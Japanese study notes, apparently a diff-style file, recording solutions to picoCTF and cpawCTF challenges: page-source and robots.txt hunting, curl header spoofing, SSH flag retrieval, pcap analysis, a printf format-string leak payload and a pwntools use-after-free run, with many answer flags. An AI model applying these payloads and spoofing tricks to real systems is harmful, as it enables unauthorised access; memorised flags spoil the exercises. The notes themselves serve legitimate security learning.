+F12 - ページのソースを表示 - G82XCw5CX3.js - /JIFxzHyW8W - http://mercury.picoctf.net:1896/JIFxzHyW8W - JIFxzHyW8Wをstringsコマンド
+F12 - Sources - Page - wasm -  00e3data
+F12 - Network - Name - JIFxzHyW8Wダブルクリック
+
+
+[Web Exploitation] WebサイトでF12して、style.cssでpicoで検索するとフラグが見つかる
+098_Web Exploitation_Search sourceソースを検索
+/** banner_main picoCTF{1nsp3ti0n_0f_w3bpag3s_587d12b8} **/
+
+
+[Web Exploitation] WebサイトでF12して、wasmに書かれている文字列をCyberchefのMagic Intensive modeするとフラグが求まる
+146_Web Exploitation_Some Assembly Required 2多少の組み立てが必要です 2
+
+picoCT=kF{ef3b0b413475d7c00ee9f1a9b620c7d8}T88T88	「=k」と「T88T88」は不要
+
+>>> xor("xakgK\5cNsmn;j8j<9;<?=l?k88mm1n9i1j>:8k?l0u\00\00", 8)	　不明
+b'picoC\rkF{ef3b0b413475d7c00ee9f1a9b620c7d8}\x08\x08'
+
+
+[Web Exploitation] Webサイトのソース、css、robots.txt、.htaccess、.DS_Storeからフラグを取得する
+031_Web Exploitation_Scavenger Hunt.mhtml
+picoCTF{t  h4ts_4_l0  t_0f_pl4c  3s_2_lO0k  _a69684fd}
+ソース		<!-- Here's the first part of the flag: picoCTF{t -->
+mycss.css	/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
+/robots.txt	# Part 3: t_0f_pl4c
+		# I think this is an apache server... can you Access the next flag?
+/.htaccess	# Part 4: 3s_2_lO0k
+		# I love making websites on my Mac, I can Store a lot of information there.
+/.DS_Store	Congrats! You completed the scavenger hunt. Part 5: _a69684fd}
+
+robots.txt	検索エンジンのクローラに対して、サイトのどの URL にアクセスしてよいかを伝えるもの
+. htaccess	Apacheというウェブサーバーソフトウェアが使用されている環境の中で、ウェブサーバーをディレクトリ単位で制御するためのファイル
+.DS_Store	Macで自動的に生成される、フォルダやファイルに関するmeta情報が記載されているファイル
+
+
+[Web Exploitation] dont-use-client-side　ページのソースに書かれている文字列からフラグを取得
+052_Web Exploitation_dont-use-client-sideクライアント側を使用しないでください
+https://jupiter.challenges.picoctf.org/problem/17682/
+
+ if (checkpass.substring(0, split) == 'pico') {
+      if (checkpass.substring(split*6, split*7) == '706c') {
+        if (checkpass.substring(split, split*2) == 'CTF{') {
+         if (checkpass.substring(split*4, split*5) == 'ts_p') {
+          if (checkpass.substring(split*3, split*4) == 'lien') {
+            if (checkpass.substring(split*5, split*6) == 'lz_b') {
+              if (checkpass.substring(split*2, split*3) == 'no_c') {
+                if (checkpass.substring(split*7, split*8) == '5}') {
+
+
+
+[Web Exploitation] Webサイトにrobots.txtを追加してフラグを取得
+044_Web Exploitation_where are the robotsロボットはどこですか
+https://jupiter.challenges.picoctf.org/problem/56830/　に　/robots.txt　を追加
+
+https://jupiter.challenges.picoctf.org/problem/56830/robots.txt
+User-agent: *
+Disallow: /1bb4c.html
+
+https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html
+Guess you found the robots
+picoCTF{ca1cu1at1ng_Mach1n3s_1bb4c}
+
+
+[Web Exploitation] MD5でハッシュ化したとき衝突するpdfをアップロードするとフラグが求まる
+056_Web Exploitation_It is my Birthday今日は私の誕生日です
+small.pngを上げるとNot a PDF!
+ネットから小さいPDFを2つ持ってきて渡すとMD5 hashes do not match!
+全く同じファイルを渡すとFiles are not different!
+
+
+[Web Exploitation] UserAgent、referer、日付、"Do Not Track"、IPアドレス、言葉を設定
+058_Web Exploitation Who are you.mhtml
+
+curl コマンドとは
+「client for URL」の略
+URL(http、httpsなどで始まる通信)で表現される通信をコマンドプロンプト でコマンド実行し、データを取得することができます。
+様々な通信プロトコルでデータの送受信を行うことができるコマンド
+よく使われる方法としては、Web サイトへ http リクエストを送信してコンテンツを表示する
+
+以下のコマンドをkaliのコマンドプロンプトで実行
+1 このサイトは、公式のピコブラウザを使用している人だけがアクセスできます！
+  curlでUserAgentを指定
+  curl -A "PicoBrowser" http://mercury.picoctf.net:39114/
+
+2 別のサイトからアクセスするユーザーを信用しません。
+  refererを設定
+  curl -A "PicoBrowser" http://mercury.picoctf.net:39114/ --referer http://mercury.picoctf.net:39114/
+
+3 申し訳ありませんが、このサイトは 2018 年にのみ機能しました。
+  日付をHeaderに入れて2018年と認識させる。
+  curl -A "PicoBrowser" -H "Date: Wed, 15 Aug 2018 07:28:00 JST" http://mercury.picoctf.net:39114/ --referer http://mercury.picoctf.net:39114/
+
+4 追跡できるユーザーを信用しません。
+  "Do Not Track" をヘッダにつけてあげる、DNT の設定を有効にする
+　Do Not Track (DNT)とはDNTとはトラッキング防止の技術のひとつで、サイトを訪れるユーザーの追跡を停止する機能
+　トラッキングは主に広告配信最適化のために行われており、Cookieを使ったトラッキングがWEBサイトでは主流となっています。
+  curl -A "PicoBrowser" -H "DNT: 1" -H "Date: Wed, 15 Aug 2018 07:28:00 JST" http://mercury.picoctf.net:39114/ --referer http://mercury.picoctf.net:39114/
+
+5 このウェブサイトはスウェーデン人専用です。
+  スウェーデンのIPレンジは下記から取得。
+  https://lite.ip2location.com/sweden-ip-address-ranges
+  curl -A "PicoBrowser" -H "X-Forwarded-For: 2.16.66.1" -H "DNT: 1" -H "Date: Wed, 15 Aug 2018 07:28:00 JST" http://mercury. picoctf.net:39114/ --referer http://mercury.picoctf.net:39114/
+
+6 あなたはスウェーデンにいますが、スウェーデン語を話せませんか?
+  言葉も設定ね。"Accept-Language"で設定します
+  curl -A "PicoBrowser" -H "Accept-Language: sv-SE" -H "X-Forwarded-For: 2.16.66.1" -H "DNT: 1" -H "Date: Wed, 15 Aug 2018 07: 28:00 JST" http://mercury.picoctf.net:39114/ --referer http://mercury.picoctf.net:39114/
+
+7  私が言えることは、どういたしまして picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_20ace0e4}
+
+
+
+
+[General Skills] メモ帳で開くいてフラグの文字列（pico）を検索
+047_General Skills_strings itそれをひもでつなぐ
+
+
+[Forensics] 画像ファイルsvgをメモ帳で開くと、フラグの文字列が
+083_Forensics_Enhance!強化する！
+
+
+[General Skills] SSH接続して、ls、cd、catコマンドでフラグを取得
+picoCTF\016_General Skills_6_Magikarp Ground Mission.mhtml
+
+# ssh ctf-player@venus.picoctf.net -p 59355
+The authenticity of host '[venus.picoctf.net]:59355 ([3.131.124.143]:59355)' can't be established.
+ED25519 key fingerprint is SHA256:P1f6h95BrSVnJbm2AKhphfHHGEyAeThib/rN/AwKs24.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[venus.picoctf.net]:59355' (ED25519) to the list of known hosts.
+ctf-player@venus.picoctf.net's password:
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1041-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+ctf-player@pico-chall$ ls
+1of3.flag.txt  instructions-to-2of3.txt
+ctf-player@pico-chall$ cat 1of3.flag.txt
+picoCTF{xxsh_
+ctf-player@pico-chall$ cat instructions-to-2of3.txt
+Next, go to the root of all things, more succinctly `/`
+ctf-player@pico-chall$ cd /
+ctf-player@pico-chall$ ls
+2of3.flag.txt  boot  etc   instructions-to-3of3.txt  lib64  mnt  proc  run   srv  tmp  var
+bin            dev   home  lib                       media  opt  root  sbin  sys  usr
+ctf-player@pico-chall$ cat 2of3.flag.txt
+0ut_0f_\/\/4t3r_
+ctf-player@pico-chall$ cd instructions-to-3of3.txt
+-bash: cd: instructions-to-3of3.txt: Not a directory
+ctf-player@pico-chall$ cat instructions-to-3of3.txt
+Lastly, ctf-player, go home... more succinctly `~`
+ctf-player@pico-chall$ cd home
+ctf-player@pico-chall$ ls
+ctf-player
+ctf-player@pico-chall$ cat ctf-player/
+cat: ctf-player/: Is a directory
+ctf-player@pico-chall$ cd ctf-player/
+ctf-player@pico-chall$ ls
+3of3.flag.txt  drop-in
+ctf-player@pico-chall$ cat 3of3.flag.txt
+c1754242}
+
+
+[General Skills] SSH接続して、ルートにあるchallengeフォルダのファイルをcatするとフラグが見つかる
+116_General Skills__Permissions権限
+
+$ ssh -p 51602 picoplayer@saturn.picoctf.net
+The authenticity of host '[saturn.picoctf.net]:51602 ([13.59.203.175]:51602)' can't be established.
+ED25519 key fingerprint is SHA256:Km7la74G7/fztU37KiXuMDlWhxowKKAxA3TjvWy1Y0o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+
+picoplayer@challenge:~$ pwd
+/home/picoplayer
+picoplayer@challenge:~$ ls
+picoplayer@challenge:~$ cd ..
+picoplayer@challenge:/home$ ls
+picoplayer
+picoplayer@challenge:/home$ cd ..
+picoplayer@challenge:/$ ls
+bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
+boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
+picoplayer@challenge:/$ cd root
+-bash: cd: root: Permission denied
+picoplayer@challenge:/$ sudo su -
+[sudo] password for picoplayer:
+Sorry, user picoplayer is not allowed to execute '/usr/bin/su -' as root on challenge.
+picoplayer@challenge:/$ ls -l
+total 0
+lrwxrwxrwx    1 root   root      7 Mar  8 02:05 bin -> usr/bin
+drwxr-xr-x    2 root   root      6 Apr 15  2020 boot
+drwxr-xr-x    1 root   root     21 Mar 16 02:29 challenge
+drwxr-xr-x    5 root   root    340 Jun 18 05:05 dev
+drwxr-xr-x    1 root   root     66 Jun 18 05:05 etc
+drwxr-xr-x    1 root   root     24 Mar 16 02:29 home
+lrwxrwxrwx    1 root   root      7 Mar  8 02:05 lib -> usr/lib
+lrwxrwxrwx    1 root   root      9 Mar  8 02:05 lib32 -> usr/lib32
+lrwxrwxrwx    1 root   root      9 Mar  8 02:05 lib64 -> usr/lib64
+lrwxrwxrwx    1 root   root     10 Mar  8 02:05 libx32 -> usr/libx32
+drwxr-xr-x    2 root   root      6 Mar  8 02:06 media
+drwxr-xr-x    2 root   root      6 Mar  8 02:06 mnt
+drwxr-xr-x    2 root   root      6 Mar  8 02:06 opt
+dr-xr-xr-x 2116 nobody nogroup   0 Jun 18 05:05 proc
+drwx------    1 root   root     23 Mar 16 02:29 root
+drwxr-xr-x    1 root   root     66 Jun 18 05:07 run
+lrwxrwxrwx    1 root   root      8 Mar  8 02:05 sbin -> usr/sbin
+drwxr-xr-x    2 root   root      6 Mar  8 02:06 srv
+dr-xr-xr-x   13 nobody nogroup   0 Jun 18 05:05 sys
+drwxrwxrwt    1 root   root      6 Mar 16 02:29 tmp
+drwxr-xr-x    1 root   root     18 Mar  8 02:06 usr
+drwxr-xr-x    1 root   root     17 Mar  8 02:09 var
+picoplayer@challenge:/$ cd challenge/
+picoplayer@challenge:/challenge$ ll
+total 4
+drwxr-xr-x 1 root root 21 Mar 16 02:29 ./
+drwxr-xr-x 1 root root 51 Jun 18 05:05 ../
+-rw-r--r-- 1 root root 98 Mar 16 02:29 metadata.json
+picoplayer@challenge:/challenge$ cat metadata.json
+{"flag": "picoCTF{uS1ng_v1m_3dit0r_021d10ab}", "username": "picoplayer", "password": "dLAqMvm7xv"}picoplayer@challenge:/challenge$ Connection to saturn.picoctf.net closed by remote host.
+Connection to saturn.picoctf.net closed.
+
+
+
+
+[General Skills] SSH接続して/etc/crontabをcatで見るとフラグが見つかる
+109_General Skills_chronoクロノ
+
+$ ssh -p 62159 picoplayer@saturn.picoctf.net
+The authenticity of host '[saturn.picoctf.net]:62159 ([13.59.203.175]:62159)' can't be established.
+ED25519 key fingerprint is SHA256:p/PvzCEZdcZTX+VPBLVApO7dmZmo7L7qwjpiIdTTHao.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:3: [hashed name]
+    ~/.ssh/known_hosts:5: [hashed name]
+    ~/.ssh/known_hosts:6: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[saturn.picoctf.net]:62159' (ED25519) to the list of known hosts.
+picoplayer@saturn.picoctf.net's password:
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.19.0-1024-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+picoplayer@challenge:~$ cat /etc/crontab
+# picoCTF{Sch3DUL7NG_T45K3_L1NUX_7754e199}
+picoplayer@challenge:~$ Connection to saturn.picoctf.net closed by remote host.
+Connection to saturn.picoctf.net closed.
+
+[Cryptography] CSRファイルをサイトで内容確認するとフラグが求まる
+117_Cryptography_ReadMyCert
+
+CSRの内容確認ツール
+https://tech-unlimited.com/csrcheck.html
+
+
+[General Skills] SSH接続して、manコマンドを実行するとフラグが求まる
+126_General Skills_useless使い物にならない
+
+man コマンド名		指定したコマンドのマニュアルを表示する
+
+$ ssh picoplayer@saturn.picoctf.net -p 52501
+picoplayer@challenge:~$ ls
+useless
+$ cat useless
+#!/bin/bash
+# Basic mathematical operations via command-line arguments
+
+if [ $# != 3 ]
+then
+  echo "Read the code first"
+else
+        if [[ "$1" == "add" ]]
+        then
+          sum=$(( $2 + $3 ))
+          echo "The Sum is: $sum"
+
+        elif [[ "$1" == "sub" ]]
+        then
+          sub=$(( $2 - $3 ))
+          echo "The Substract is: $sub"
+
+        elif [[ "$1" == "div" ]]
+        then
+          div=$(( $2 / $3 ))
+          echo "The quotient is: $div"
+
+        elif [[ "$1" == "mul" ]]
+        then
+          mul=$(( $2 * $3 ))
+          echo "The product is: $mul"
+
+        else
+          echo "Read the manual"
+
+        fi
+fi
+picoplayer@challenge:~$ man useless
+
+useless
+     useless, — This is a simple calculator script
+
+SYNOPSIS
+     useless, [add sub mul div] number1 number2
+
+DESCRIPTION
+     Use the useless, macro to make simple calulations like addition,subtraction, multiplication and division.
+
+Examples
+     ./useless add 1 2
+       This will add 1 and 2 and return 3
+
+     ./useless mul 2 3
+       This will return 6 as a product of 2 and 3
+
+     ./useless div 6 3
+       This will return 2 as a quotient of 6 and 3
+
+     ./useless sub 6 5
+       This will return 1 as a remainder of substraction of 5 from 6
+
+Authors
+     This script was designed and developed by Cylab Africa
+
+     picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_5562}
+
+picoplayer@challenge:~$ Connection to saturn.picoctf.net closed by remote host.
+Connection to saturn.picoctf.net closed.
+
+
+[Reverse Engineering] daeファイルをサイトで解析して、入力値を5倍してCyberchefで「From Hex」するとフラグが求まる
+127_Reverse Engineering_Virtual Machine 0仮想マシン0
+
+3D DAE ファイルをオンラインで表示する
+https://imagetostl.com/view-dae-online
+
+赤軸-青軸の間に40歯のギアと8歯のギアが存在することが分かる。 
+つまり赤軸が1回転すると青軸は5回転することになるので、input.txtの値を5倍
+
+$ python
+>>> hex(39722847074734820757600524178581224432297292490103996085769154356559546905*5)
+'0x7069636f4354467b67333472355f30665f6d3072335f63313333656165327d'
+
+
+[General Skills] 与えられた16数数をCyberchefで「From Hex」するとフラグが求まる
+130_General Skills_ASCII NumbersASCII 数字
+
+0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x35 0x63 0x31 0x31 0x5f 0x6e 0x30 0x5f 0x71 0x75 0x33 0x35 0x37 0x31 0x30 0x6e 0x35 0x5f 0x31 0x6c 0x6c 0x5f 0x74 0x33 0x31 0x31 0x5f 0x79 0x33 0x5f 0x6e 0x30 0x5f 0x6c 0x31 0x33 0x35 0x5f 0x34 0x34 0x35 0x64 0x34 0x31 0x38 0x30 0x7d
+
+
+[Forensics] emlファイルをメモ帳で開いて、そこからIPアドレスを見つけ、whoisコマンドで調べると差出人がわかり、フラグが求まる
+128_Forensics_who is itどなた？
+
+$ whois 173.249.33.206
+
+#
+# ARIN WHOIS data and services are subject to the Terms of Use
+# available at: https://www.arin.net/resources/registry/whois/tou/
+#
+# If you see inaccuracies in the results, please report at
+# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
+#
+# Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
+#
+
+NetRange:       173.249.0.0 - 173.249.63.255
+CIDR:           173.249.0.0/18
+NetName:        RIPE
+NetHandle:      NET-173-249-0-0-1
+Parent:         NET173 (NET-173-0-0-0-0)
+NetType:        Early Registrations, Transferred to RIPE NCC
+OriginAS:
+Organization:   RIPE Network Coordination Centre (RIPE)
+RegDate:        2017-09-14
+Updated:        2017-09-14
+Ref:            https://rdap.arin.net/registry/ip/173.249.0.0
+
+ResourceLink:  https://apps.db.ripe.net/search/query.html
+ResourceLink:  whois://whois.ripe.net
+
+OrgName:        RIPE Network Coordination Centre
+OrgId:          RIPE
+Address:        P.O. Box 10096
+City:           Amsterdam
+StateProv:
+PostalCode:     1001EB
+Country:        NL
+RegDate:
+Updated:        2013-07-29
+Ref:            https://rdap.arin.net/registry/entity/RIPE
+
+ReferralServer:  whois://whois.ripe.net
+ResourceLink:  https://apps.db.ripe.net/search/query.html
+
+OrgTechHandle: RNO29-ARIN
+OrgTechName:   RIPE NCC Operations
+OrgTechPhone:  +31 20 535 4444
+OrgTechEmail:  hostmaster@ripe.net
+OrgTechRef:    https://rdap.arin.net/registry/entity/RNO29-ARIN
+
+OrgAbuseHandle: ABUSE3850-ARIN
+OrgAbuseName:   Abuse Contact
+OrgAbusePhone:  +31205354444
+OrgAbuseEmail:  abuse@ripe.net
+OrgAbuseRef:    https://rdap.arin.net/registry/entity/ABUSE3850-ARIN
+
+#
+# ARIN WHOIS data and services are subject to the Terms of Use
+# available at: https://www.arin.net/resources/registry/whois/tou/
+#
+# If you see inaccuracies in the results, please report at
+# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
+#
+# Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
+#
+
+Found a referral to whois.ripe.net.
+
+% This is the RIPE Database query service.
+% The objects are in RPSL format.
+%
+% The RIPE Database is subject to Terms and Conditions.
+% See http://www.ripe.net/db/support/db-terms-conditions.pdf
+
+% Note: this output has been filtered.
+%       To receive output for a database update, use the "-B" flag.
+
+% Information related to '173.249.32.0 - 173.249.63.255'
+
+% Abuse contact for '173.249.32.0 - 173.249.63.255' is 'abuse@contabo.de'
+
+inetnum:        173.249.32.0 - 173.249.63.255
+netname:        CONTABO
+descr:          Contabo GmbH
+country:        DE
+org:            ORG-GG22-RIPE
+admin-c:        MH7476-RIPE
+tech-c:         MH7476-RIPE
+status:         ASSIGNED PA
+mnt-by:         MNT-CONTABO
+created:        2018-08-22T07:28:02Z
+last-modified:  2018-08-22T07:28:02Z
+source:         RIPE
+
+organisation:   ORG-GG22-RIPE
+org-name:       Contabo GmbH
+country:        DE
+org-type:       LIR
+remarks:        * Please direct all complaints about Internet abuse like Spam, hacking or scans *
+remarks:        * to abuse@contabo.de . This will guarantee fastest processing possible. *
+address:        Aschauer Strasse 32a
+address:        81549
+address:        Munchen
+address:        GERMANY
+phone:          +498921268372
+fax-no:         +498921665862
+abuse-c:        MH12453-RIPE
+mnt-ref:        RIPE-NCC-HM-MNT
+mnt-ref:        MNT-CONTABO
+mnt-ref:        MNT-OCIRIS
+mnt-by:         RIPE-NCC-HM-MNT
+mnt-by:         MNT-CONTABO
+created:        2009-12-09T13:41:08Z
+last-modified:  2021-09-14T10:49:04Z
+source:         RIPE # Filtered
+
+person:         Wilhelm Zwalina
+address:        Contabo GmbH
+address:        Aschauer Str. 32a
+address:        81549 Muenchen
+phone:          +49 89 21268372
+fax-no:         +49 89 21665862
+nic-hdl:        MH7476-RIPE
+mnt-by:         MNT-CONTABO
+mnt-by:         MNT-GIGA-HOSTING
+created:        2010-01-04T10:41:37Z
+last-modified:  2020-04-24T16:09:30Z
+source:         RIPE
+
+% Information related to '173.249.32.0/23AS51167'
+
+route:          173.249.32.0/23
+descr:          CONTABO
+origin:         AS51167
+mnt-by:         MNT-CONTABO
+created:        2018-02-01T09:50:10Z
+last-modified:  2018-02-01T09:50:10Z
+source:         RIPE
+
+% This query was served by the RIPE Database Query Service version 1.107 (BUSA)
+
+
+[Network] pcapファイルからフラグを入手
+cpawCTF\Level_1_7_[Network]pcap.mhtml
+wiresharkで開くと右側にフラグ
+メモ帳、stringsコマンド
+
+
+[Network+Forensic] pcapファイルをHTTP出力
+cpawCTF\Level_2_3_[Network+Forensic]HTTP.mhtml
+Wireshark - File - Export Objects - HTTP - SAVE ALL - OPEN - htmlに拡張子変更 - jsをjsフォルダ、jpgをimgフォルダに格納 - htmlを開いて「ボタン」をクリック
+難読化されたjsファイルの整形
+https://beautifier.io/　コードを貼り付けてBeauty Codeをクリック
+
+
+[Network] pcapファイルからFTP接続でファイルをダウンロード
+cpawCTF\Level_2_10_[Network] Can you login？.mhtml
+Wireshark - tcp.stream eq 1でフィルタリング（tcp.stream eq 1を入力） - 右クリック（対象はどれでも良い） - Follow - TCP Stream
+ - Terminal（コマンドプロンプト）起動 - ftp入力 - open入力 - IPアドレス、ユーザー名、パスワード入力（TCP Stream画面参照）
+ - passive入力（パッシブモードに変更） 
+ - lcd /home/username/Desktop入力 - ls -a入力 - get dummy - get .hidden_flag_file入力
+ - view - show hidden fileにチェックを付ける - .hidden_flag_fileをメモ帳で開く
+
+ftpコマンド：FTP接続を行う
+lcdコマンド：FTPクライアントのカレントディレクトリの移動（デフォルトはルートディレクトリ「/」のため Permmition Deniedになるため）
+passiveコマンド：クライアントからサーバに対して接続要求を行う
+                 アクティブモード（サーバ側からクライアント側に接続）だとクライアント側のファイアウォールに通信が拒否されることがあるため
+getコマンド：FTPクライアントからFTPサーバに対して、1つのファイルをダウンロード
+ls -a コマンド：隠しファイルも含めてファイルを表示（.hidden_flag_fileは隠しファイルになり見えないため）
+
+
+
+[Forensics] Wiresharkでフラグを抽出（フラグの導出方法は不明）
+057_Forensics_Wireshark twoo twooo two twoo...ツーツーツーツーツー...
+$ curl http://www.reddshrimpandherring.com
+Congrats! Was that tooooo easy?
+Flag: cGljb0NURntmMXNoeV9zMXR1NHRpMG5fc2VsYmF0X3liYm9iX2VsdHRpbH0=
+
+$ tshark -nr shark2.pcapng -Y 'dns && ip.src == 192.168.38.104 && frame contains "local" && ip.dst==18.217.1.57' | awk '{ print $12 }' | awk -F. '{
+print $1 }' | tr -d "\n"
+cGljb0NURntkbnNfM3hmMWxfZnR3X2RlYWRiZWVmfQ==fQ==
+
+base64 としてデコード
+echo cGljb0NURntkbnNfM3hmMWxfZnR3X2RlYWRiZWVmfQ==  | base64 -d
+picoCTF{dns_3xf1l_ftw_deadbeef}
+
+
+[Forensics] Wiresharkで4番目のパケットのTCP Payload（16進数に対応する文字）にあるフラグを抽出 又は stringsでもフラグを導出可能
+093_Forensics_Packets Primerパケット入門書
+
+
+[Forensics] pcapファイルをstringsコマンド（又はWiresharkで読み込んで、フラグの先頭文字列で検索（Packed bytes、Narrow(UTF-8/ASCII)、String、pico））するとフラグが求まる
+115_Forensics_PcapPoisoningPcap中毒
+
+$ strings 115_trace.pcap | grep picoCTF
+picoCTF{P64P_4N4L7S1S_SU55355FUL_31010c46}F~
+
+507番目のパケットにフラグがある
+
+
+
+[Forensic] WebサイトのログインをBurp suiteで傍受すると、Responseに表示される文字列をドラッグすると右側に（又はCyberchefでFrom Base64で複合すると）フラグが求まる
+111_Forensics_hideme
+
+kali linux - [ドラゴンマーク]→[03-Web Application Analysis]→[Burp Suite]
+kali linuxのFirefoxでhttp://saturn.picoctf.net:64739/にアクセス
+Burp Suit - Proxy - HTTP history に傍受された通信の一覧が表示される
+
+/next-page/id=cGljb0NURntwcm94aWVzX2Fs
+/next-page/id=bF90aGVfd2F5XzAxZTc0OGRifQ==
+
+ユーザー名とパスワードを入力して送信すると、サーバーにデータを送信してその情報を更新するための HTTP POST リクエストが生成される
+
+
+[Binary Exploitation]
+picoCTF\008_Binary Exploitation_1_Stonks.mhtml
+遠隔のサーバー上で実行されているプログラムの脆弱性（書式文字列攻撃）を突いてフラグを取得する
+
+buy_stonks関数の中 (93行目) に書式文字列攻撃の脆弱性
+printf(user_buf);
+プログラムに対して書式文字列攻撃（入力値としてAAAA%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p を渡したところ、%pが書式文字列として扱われ、スタック上の値が読み出される）
+
+buy_stonks関数が呼び出されるとapiという名前のファイルからフラグがスタック上に読み出される
+char api_buf[FLAG_BUFFER];
+	FILE *f = fopen("api","r");
+	if (!f) {
+		printf("Flag file not found. Contact an admin.\n");
+		exit(1);
+	}
+	fgets(api_buf, FLAG_BUFFER, f);
+
+Aでなくても、何の文字列でもよい
+Aが4つなのは、エンディアン変換（4文字ごとに位置を入れ替え）のため（エンディアン変換は問題としてフラグが変換されているため、本来は必要ない）
+,はなくても良い
+%pの数に応じてスタック上の値が呼び出される
+
+
+
+[General_Skills] ncコマンドで求まった値をアスキー表示（From Decimal）
+picoCTF\006_General_Skills_4_Nice netcat....mhtml
+nc mercury.picoctf.net 35652
+nc(netcat)コマンド：Networkをcatenate(連結)するという意味
+　　　　　　　　　　ネットワークを使ってデータを送ったり待ち受けたりすることのできるコマンド
+　　　　　　　　　　ネットワークの疎通確認等に使われる
+
+
+[General Skills] ncコマンドを実行するとフラグが求まる
+046_General Skills_what's a net cat?網猫とは
+
+nc jupiter.challenges.picoctf.org 41120 
+You're on your way to becoming the net cat master
+picoCTF{nEtCat_Mast3ry_3214be47}
+
+
+[Binary Exploitation] 脆弱性を利用してエクスプロイトするとフラグが求まる
+060_Binary Exploitation_Unsubscriptions Are Free購読解除は無料です
+
+原理、ソースコードとも不明
+$ python 060_a.py
+[+] Starting local process '/usr/bin/nc': pid 6693
+[+] Leaking vuln function's address
+/mnt/c/Users/user/Desktop/picoCTF/060_a.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  resp = proc.recvuntil("xit")
+/mnt/c/Users/user/Desktop/picoCTF/060_a.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  proc.sendline("s")
+/mnt/c/Users/user/Desktop/picoCTF/060_a.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  resp = proc.recvuntil("xit")
+[*] Vuln function addr: b'0x80487d6' -> 134514646 --> 0x80487d6
+[+] Deleting user struct
+/mnt/c/Users/user/Desktop/picoCTF/060_a.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  proc.sendline("i")
+/mnt/c/Users/user/Desktop/picoCTF/060_a.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  proc.recvuntil("?")
+/mnt/c/Users/user/Desktop/picoCTF/060_a.py:24: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  proc.sendline("Y")
+/mnt/c/Users/user/Desktop/picoCTF/060_a.py:25: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  resp = proc.recvuntil("xit")
+[*] User is now free
+[+] Updating value for user function, with vuln function
+/mnt/c/Users/user/Desktop/picoCTF/060_a.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  proc.sendline("l")
+/mnt/c/Users/user/Desktop/picoCTF/060_a.py:31: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  resp = proc.recvuntil(":\n")
+[*] Value updated
+[+] Get flag
+[!] Here is the flag: picoCTF{d0ubl3_j30p4rdy_868227ee}
+[*] Stopped process '/usr/bin/nc' (pid 6693)
+
+
+[Forensics] JPEGのEXIFを調査
+cpawCTF\Level_1_6_[Forensics] River.mhtml
+ファイルのプロパティ確認
+exiftoolコマンド：EXIF情報を表示する（EXIF(Exchangeable image file format)は写真(jpg)に情報を追加して保存できるフォーマット）
+EXIF確認君 http://exif-check.org/
+
+[Forensics] JPEGのEXIFを調査してbase64の変換
+picoCTF\005_Forensics_1_information.mhtml
+EXIF確認君：情報なし
+exiftoolコマンド
+読み取れない文字列をcyberchefのFrom Base64で変換してフラグを取得
+
+
+[General Skills] 文字列をFrom Base 64で変換してフラグを取得
+053_General Skills_Bases
+bDNhcm5fdGgzX3IwcDM1
+l3arn_th3_r0p35
+picoCTF{l3arn_th3_r0p35}
+
+
+[Forensics] ファイルのヘッダからBMPファイルと推定し、ヘッダを書き換えて正しく開けるようにしてフラグを取得
+picoCTF\017_Forensics_7_tunn3l v1s10n.mhtml
+ヘッダ
+前　42 4D   8E 26 2C 00        00 00 00 00   BA D0 00 00                                 BA D0 00 00                                      6E 04 00 00              32 01 00 00     01 00 18 00 
+後　42 4D   8E 26 2C 00        00 00 00 00   36 00 00 00                                 28 00 00 00                                      6E 04 00 00              40 03 00 00     01 00 18 00 00 00
+    B  M    0x002c268e=2.75MB                ファイル先頭から画像データまでのオフセット  情報ヘッダサイズ　　　　　　　　　　　　　　　　 横                       縦
